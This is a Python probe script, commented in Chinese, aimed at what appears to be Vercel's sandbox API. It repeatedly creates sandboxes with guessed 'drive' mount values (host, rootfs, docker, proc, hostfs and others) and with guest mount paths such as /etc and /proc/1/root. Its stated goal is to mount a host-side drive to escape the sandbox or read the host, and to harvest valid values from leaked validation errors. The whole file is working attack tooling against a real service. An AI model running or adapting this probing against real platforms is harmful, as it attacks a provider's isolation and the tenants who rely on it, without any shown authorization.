# -*- coding: utf-8 -*-
"""mounts drive 字段枚举: 确定 drive 合法值 -> 若可挂载 host 侧 drive -> 逃逸/读 host 面
错误信息模式分析: 枚举校验 -> "should be equal to one of [...]" 泄露列表
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

OUT = r'F:\scan\skills\out\_driveprobe.txt'
buf = []
def log(s):
    print(s, flush=True)
    buf.append(s)

def try_mount(drive, tag, guest='/mnt/x'):
    body = {"projectId": PROJ, "name": 'drvx', "mounts": {guest: {"drive": drive}}}
    c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, body)
    log('[%s] %s | %s' % (tag, c, r[:400].replace('\n', ' ')))
    if c == 200:
        time.sleep(1)
        api("DELETE", "/v2/sandboxes/drvx?teamId=%s&projectId=%s" % (TEAM, PROJ))
        time.sleep(1)
    return c, r

def main():
    log('===== drive value enumeration =====')
    drives = [
        "host", "root", "data", "vda", "rootfs", "tmpfs", "ephemeral",
        "workspace", "home", "system", "boot", "docker", "containerd",
        "cache", "logs", "proc", "dev", "share", "vercel", "sandbox",
        "image", "layer", "overlay", "runtime", "hostfs", "vm", "microvm",
        "snapshot", "disk", "disk0", "disk1", "vdb", "vdc", "sda", "xvda",
        "volume", "vol", "fs", "nfs", "efs", "ebs", "s3", "mem", "init",
        "guest", "hostfs0", "rootfs0", "persistent", "local", "bind",
    ]
    for i, d in enumerate(drives):
        try_mount(d, 'drive-%s' % d)
        time.sleep(0.3)

    # 若 400 枚举错误出现, 尝试从错误里找更多; 也测 guest 路径控制
    log('')
    log('===== guest path control =====')
    for gp in ['/mnt/x', '/etc', '/proc/1/root', '/vercel/sandbox/x', '/', '/mnt', '/dev']:
        body = {"projectId": PROJ, "name": 'drvp', "mounts": {gp: {"drive": "data"}}}
        c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, body)
        log('[gp:%s] %s | %s' % (gp, c, r[:250].replace('\n', ' ')))
        if c == 200:
            time.sleep(1)
            api("DELETE", "/v2/sandboxes/drvp?teamId=%s&projectId=%s" % (TEAM, PROJ))
            time.sleep(1)

    log('DONE')
    open(OUT, 'w', encoding='utf-8').write('\n'.join(buf))
    log('saved -> %s' % OUT)

if __name__ == '__main__':
    main()
